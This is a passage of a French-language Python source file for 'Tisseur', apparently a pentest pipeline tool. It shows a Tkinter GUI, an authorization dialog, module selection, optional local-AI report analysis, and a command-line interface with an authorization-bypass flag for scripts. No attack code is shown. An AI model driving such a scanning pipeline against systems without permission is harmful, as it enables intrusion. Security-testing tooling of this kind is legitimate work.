            tk.Label(form, text="Cible (IP) :", fg=TEXTE_HEX, bg=NOIR_HEX).grid(row=0, column=0, sticky="w")
            self.target_var = tk.StringVar()
            target_entry = tk.Entry(form, textvariable=self.target_var, width=28, **entry_style)
            target_entry.grid(row=0, column=1, sticky="w", padx=8, pady=3)
            self._add_context_menu(target_entry)

            tk.Label(form, text="URL (optionnel) :", fg=TEXTE_HEX, bg=NOIR_HEX).grid(row=1, column=0, sticky="w")
            self.url_var = tk.StringVar()
            url_entry = tk.Entry(form, textvariable=self.url_var, width=28, **entry_style)
            url_entry.grid(row=1, column=1, sticky="w", padx=8, pady=3)
            self._add_context_menu(url_entry)

            tk.Label(form, text="Mission (optionnel) :", fg=TEXTE_HEX, bg=NOIR_HEX).grid(row=2, column=0, sticky="w")
            self.mission_var = tk.StringVar()
            mission_entry = tk.Entry(form, textvariable=self.mission_var, width=28, **entry_style)
            mission_entry.grid(row=2, column=1, sticky="w", padx=8, pady=3)
            self._add_context_menu(mission_entry)
            tk.Label(form, text="(objectif donné à l'IA)", fg=MUTED_HEX, bg=NOIR_HEX).grid(row=2, column=2, sticky="w")

            mod_frame = tk.LabelFrame(root, text="Modules", fg=C_SCAN, bg=NOIR_HEX, labelanchor="nw")
            mod_frame.pack(fill="x", padx=16, pady=8)

            self.module_vars = {}
            all_modules = sorted(set(s[0] for s in STEPS))
            for i, mod in enumerate(all_modules):
                var = tk.BooleanVar(value=True)
                coul = MODULE_COULEURS.get(mod, TEXTE_HEX)
                tk.Checkbutton(
                    mod_frame, text=mod, variable=var, fg=coul, bg=NOIR_HEX,
                    selectcolor="#161616", activebackground=NOIR_HEX, activeforeground=coul,
                ).grid(row=0, column=i, padx=6, pady=4, sticky="w")
                self.module_vars[mod] = var

            # --- Panneau IA locale ---
            ia_frame = tk.LabelFrame(root, text="IA locale (analyse)", fg=C_GAMER, bg=NOIR_HEX, labelanchor="nw")
            ia_frame.pack(fill="x", padx=16, pady=(0, 8))

            self.ia_var = tk.BooleanVar(value=False)
            tk.Checkbutton(
                ia_frame, text="Analyser le rapport avec une IA locale à la fin",
                variable=self.ia_var, fg=C_GAMER, bg=NOIR_HEX,
                selectcolor="#161616", activebackground=NOIR_HEX, activeforeground=C_GAMER,
            ).grid(row=0, column=0, columnspan=4, padx=6, pady=(4, 0), sticky="w")

            tk.Label(ia_frame, text="Moteur :", fg=TEXTE_HEX, bg=NOIR_HEX).grid(row=1, column=0, padx=6, pady=4, sticky="w")
            self.ia_moteur_var = tk.StringVar(value="ollama")
            tk.OptionMenu(ia_frame, self.ia_moteur_var, "ollama", "llamacpp").grid(row=1, column=1, padx=4, pady=4, sticky="w")

            tk.Label(ia_frame, text="Modèle :", fg=TEXTE_HEX, bg=NOIR_HEX).grid(row=1, column=2, padx=6, pady=4, sticky="w")
            self.ia_modele_var = tk.StringVar(value="llama3")
            tk.Entry(ia_frame, textvariable=self.ia_modele_var, width=16, **entry_style).grid(row=1, column=3, padx=4, pady=4, sticky="w")

            self.html_var = tk.BooleanVar(value=False)
            tk.Checkbutton(
                ia_frame, text="Générer aussi un rapport HTML",
                variable=self.html_var, fg=C_DL, bg=NOIR_HEX,
                selectcolor="#161616", activebackground=NOIR_HEX, activeforeground=C_DL,
            ).grid(row=2, column=0, columnspan=4, padx=6, pady=(0, 4), sticky="w")

            btn_frame = tk.Frame(root, bg=NOIR_HEX)
            btn_frame.pack(fill="x", padx=16, pady=4)

            self.launch_btn = tk.Button(
                btn_frame, text="Lancer", command=self.launch,
                bg=C_NET, fg="#0A0A0A", activebackground=C_SCAN, activeforeground="#0A0A0A",
                font=("Arial", 11, "bold"), relief="flat", padx=12,
            )
            self.launch_btn.pack(side="left")

            tk.Button(
                btn_frame, text="Guide", command=self.show_guide,
                bg="#161616", fg=C_HELP, activebackground="#1E1E1E", activeforeground=C_HELP,
                relief="flat", padx=12,
            ).pack(side="left", padx=8)

            tk.Button(
                btn_frame, text="Copier le rapport", command=self.copy_output,
                bg="#161616", fg=C_DL, activebackground="#1E1E1E", activeforeground=C_DL,
                relief="flat", padx=12,
            ).pack(side="left")

            self.output = scrolledtext.ScrolledText(
                root, bg="#070707", fg=TEXTE_HEX, insertbackground=ACCENT_HEX, font=("Consolas", 10),
            )
            self.output.pack(fill="both", expand=True, padx=16, pady=(8, 16))
            self._add_context_menu(self.output)

            self.root.after(100, self.poll_queue)

        def _add_context_menu(self, widget):
            # Menu clic-droit + raccourcis clavier fiables (indépendants du
            # layout du clavier, contrairement aux bindings Ctrl par défaut).
            import tkinter as tk
            menu = tk.Menu(widget, tearoff=0)
            menu.add_command(label="Couper", command=lambda: widget.event_generate("<<Cut>>"))
            menu.add_command(label="Copier", command=lambda: widget.event_generate("<<Copy>>"))
            menu.add_command(label="Coller", command=lambda: widget.event_generate("<<Paste>>"))
            menu.add_separator()
            menu.add_command(label="Tout sélectionner",
                             command=lambda: self._select_all(widget))

            def popup(event):
                widget.focus_set()
                menu.tk_popup(event.x_root, event.y_root)

            widget.bind("<Button-3>", popup)   # clic droit (Windows/Linux)
            widget.bind("<Button-2>", popup)   # clic droit (macOS)
            widget.bind("<Control-a>", lambda e: (self._select_all(widget), "break")[1])
            widget.bind("<Control-A>", lambda e: (self._select_all(widget), "break")[1])

        @staticmethod
        def _select_all(widget):
            try:
                if isinstance(widget, scrolledtext.ScrolledText):
                    widget.tag_add("sel", "1.0", "end-1c")
                else:
                    widget.select_range(0, "end")
                    widget.icursor("end")
            except Exception:
                pass

        def copy_output(self):
            text = self.output.get("1.0", "end-1c")
            self.root.clipboard_clear()
            self.root.clipboard_append(text)

        def log(self, text):
            self.msg_queue.put(text)

        def poll_queue(self):
            try:
                while True:
                    line = self.msg_queue.get_nowait()
                    self.output.insert("end", str(line) + "\n")
                    self.output.see("end")
            except queue.Empty:
                pass
            self.root.after(100, self.poll_queue)

        def show_guide(self):
            win = tk.Toplevel(self.root)
            win.title("Guide — Tisseur")
            win.configure(bg=NOIR_HEX)
            win.geometry("620x480")
            txt = scrolledtext.ScrolledText(win, bg="#070707", fg=TEXTE_HEX, font=("Consolas", 10))
            txt.pack(fill="both", expand=True, padx=10, pady=10)
            txt.insert("end", get_guide_text())
            txt.config(state="disabled")

        def launch(self):
            target = self.target_var.get().strip()
            if not target:
                messagebox.showwarning("Tisseur", "Entre une IP de cible.")
                return
            url = self.url_var.get().strip() or None
            selected = [m for m, v in self.module_vars.items() if v.get()]
            if not selected:
                messagebox.showwarning("Tisseur", "Sélectionne au moins un module.")
                return
            modules_str = ",".join(selected)

            # Confirmation d'autorisation (éthique).
            if not messagebox.askyesno(
                "Autorisation",
                f"As-tu l'autorisation EXPLICITE de tester {target} ?\n\n"
                "Teste seulement ce que tu possèdes ou as le droit de tester.",
            ):
                return

            mission = self.mission_var.get().strip()
            html_out = self.html_var.get()
            ia = None
            if self.ia_var.get():
                ia = {
                    "moteur": self.ia_moteur_var.get(),
                    "modele": self.ia_modele_var.get().strip() or None,
                    "url": None,
                }

            self.launch_btn.config(state="disabled")
            self.output.delete("1.0", "end")

            threading.Thread(
                target=self._run,
                args=(target, url, modules_str, ia, html_out, mission),
                daemon=True,
            ).start()

        def _run(self, target, url, modules_str, ia=None, html_out=False, mission=""):
            # assume_yes=True : l'autorisation a déjà été confirmée par le dialogue.
            run_pipeline(target, url, modules_str, output=self.log, ia=ia,
                         assume_yes=True, html_out=html_out, mission=mission)
            self.root.after(0, lambda: self.launch_btn.config(state="normal"))

    root = tk.Tk()
    TisseurApp(root)
    root.mainloop()


def _argv_valeur(flag, defaut=None):
    """Récupère la valeur qui suit un flag dans sys.argv (pour /chat autonome)."""
    if flag in sys.argv:
        i = sys.argv.index(flag)
        if i + 1 < len(sys.argv):
            return sys.argv[i + 1]
    return defaut


def main():
    # Pas d'arguments -> menu interactif dans le terminal (avec accès à la GUI dedans).
    # --gui -> ouvre direct la fenêtre.
    # --target ... -> mode direct, pour scripts/automatisation.
    if len(sys.argv) == 1:
        interactive_menu()
        return

    if "--gui" in sys.argv:
        launch_gui()
        return

    if "--guide" in sys.argv:
        print_banner()
        show_guide_terminal()
        return

    # /chat tout seul -> chat IA sur le dernier rapport, sans relancer de scan.
    if "/chat" in sys.argv:
        print_banner()
        ia = {
            "moteur": _argv_valeur("--ia-moteur", "ollama"),
            "modele": _argv_valeur("--ia-modele", None),
            "url": _argv_valeur("--ia-url", None),
        }
        mission = _argv_valeur("--mission", "")
        lancer_chat_sur_dernier_rapport(ia=ia, mission=mission)
        return

    parser = argparse.ArgumentParser(description="Tisseur — pipeline de pentest, Hacking 101")
    parser.add_argument("--target", default=None, help="IP ou host de la cible")
    parser.add_argument("--url", default=None, help="URL pour les outils web (défaut: http://<target>)")
    parser.add_argument("--modules", default=None,
                         help="Liste de modules séparés par virgule (défaut: tous). "
                              "Ex: Reconnaissance,Scanning")
    parser.add_argument("--guide", action="store_true", help="Affiche le guide puis quitte")
    parser.add_argument("--check", action="store_true",
                         help="Vérifie seulement quels outils sont installés, puis quitte")
    parser.add_argument("--html", action="store_true",
                         help="Génère aussi un rapport HTML en plus du .md")
    parser.add_argument("--oui", action="store_true",
                         help="Confirme d'avance l'autorisation de tester (pour scripts)")
    parser.add_argument("--mission", default="",
                         help="Rapport de mission / objectif, pour diriger l'IA")
    parser.add_argument("--ia", action="store_true",
                         help="Analyse le rapport avec une IA LOCALE à la fin (conseils)")
    parser.add_argument("--chat", action="store_true",
                         help="Ouvre le chat IA après le scan (implique --ia)")
    parser.add_argument("--ia-moteur", default="ollama", choices=["ollama", "llamacpp"],
                         help="Moteur d'IA locale (défaut: ollama)")
    parser.add_argument("--ia-modele", default=None,
                         help="Nom du modèle (ollama: défaut 'llama3')")
    parser.add_argument("--ia-url", default=None,
                         help="URL de l'API IA (défaut: ollama http://localhost:11434, "
                              "llamacpp http://localhost:8080)")
    args = parser.parse_args()

    print_banner()

    # --check : juste vérifier les outils et quitter.
    if args.check:
        wanted = [m.strip() for m in args.modules.split(",")] if args.modules else None
        steps = [s for s in STEPS if wanted is None or s[0] in wanted]
        verifier_outils(steps)
        return

    if not args.target:
        parser.error("--target est requis (sauf avec --guide, --check, --gui ou /chat)")

    ia = None
    if args.ia or args.chat:
        ia = {"moteur": args.ia_moteur, "modele": args.ia_modele, "url": args.ia_url}

    run_pipeline(args.target, args.url, args.modules, ia=ia,
                 assume_yes=args.oui, html_out=args.html, chat=args.chat, mission=args.mission)


if __name__ == "__main__":
    main()
